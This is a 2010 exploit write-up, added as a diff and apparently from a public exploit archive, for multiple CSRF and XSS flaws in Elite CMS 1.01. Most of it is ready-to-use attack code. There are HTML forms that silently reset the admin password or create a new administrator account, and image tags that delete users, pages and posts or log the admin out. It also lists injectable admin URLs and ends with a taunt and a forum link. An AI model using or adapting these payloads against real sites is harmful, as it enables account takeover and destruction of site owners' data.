@@ -1,0 +1,82 @@
+# Name: Elite CMS 1.01 Multiple XSS/CSRF Vulnerabilities
+# Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+# Date: Sat 10 Jul 2010 08:05:44 PM EEST 
+# Vendor: http://elitecms.net/
+# Download: http://elitecms.net/download.php?download=eliteCMS
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    <html>
+        <head>
+            <title>Elite CMS 1.01 Multiple XSS/CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body>
+                <!--- Edit these --->
+            <form action="http://[domain]/admin/edit_user.php?user=1" method="post">
+                <input type="hidden" name="password" value="pwned" />
+                <input type="hidden" name="email" value="pwn@pwned.com" />
+                <input type="hidden" name="first_name" value="pwned" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="s_admin" value="1" />
+                <input type="hidden" name="active" value="1" />
+                <!--- At least they check this --->
+                <input type="submit" name="submit" value="Continue" />
+            </form>
+        </body>
+    </html>
+
+-=[ CSRF PoC 2 - Create Admin User ]=-
+
+    <html>
+        <head>
+            <title>Elite CMS 1.01 Multiple XSS/CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <body>
+                <!--- Edit these --->
+            <form action="http://[domain]/admin/new_user.php" method="post">
+                <input type="hidden" name="user_name" value="root" />
+                <input type="hidden" name="password" value="root" />
+                <input type="hidden" name="email" value="root@root.com"/>
+                <input type="hidden" name="first_name" value="root"/>
+                <!--- Do not edit below --->
+                <input type="hidden" name="s_admin" value="1" />
+                <input type="hidden" name="active" value="1" />
+                <!--- At least they check this --->
+                <input type="submit" name="submit" value="Continue" />
+            </form>
+        </body>
+    </html>
+
+-=[ CSRF PoC 3 - Delete User ]=-
+
+    <img src="http://[domain]/admin/delete_user.php?user=2" alt="Do you see this?" />
+
+-=[ CSRF PoC 4 - Delete Page ]=-
+
+    <img src="http://[domain]/admin/delete_page.php?page=1" alt="Do you see this?" />
+
+-=[ CSRF PoC 5 - Delete Post ]=-
+
+    <img src="http://[domain]/admin/delete_post.php?post=1" alt="Do you see this?" />
+
+-=[ CSRF PoC 6 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/admin/logout.php" alt="Do you see this?" />
+
+-=[ XSS ]=-
+
+    http://[domain]/admin/edit_page.php?page=1[XSS]
+    http://[domain]/admin/edit_post.php?page=1[XSS]
+    http://[domain]/admin/add_post.php?page=1[XSS]
+
+Also all of the text fields in the administration panel accept xss code.
+
+
+Not so l33t huh?
+Visit us at http://www.evilzone.org/.
+
+
+
+
+
+
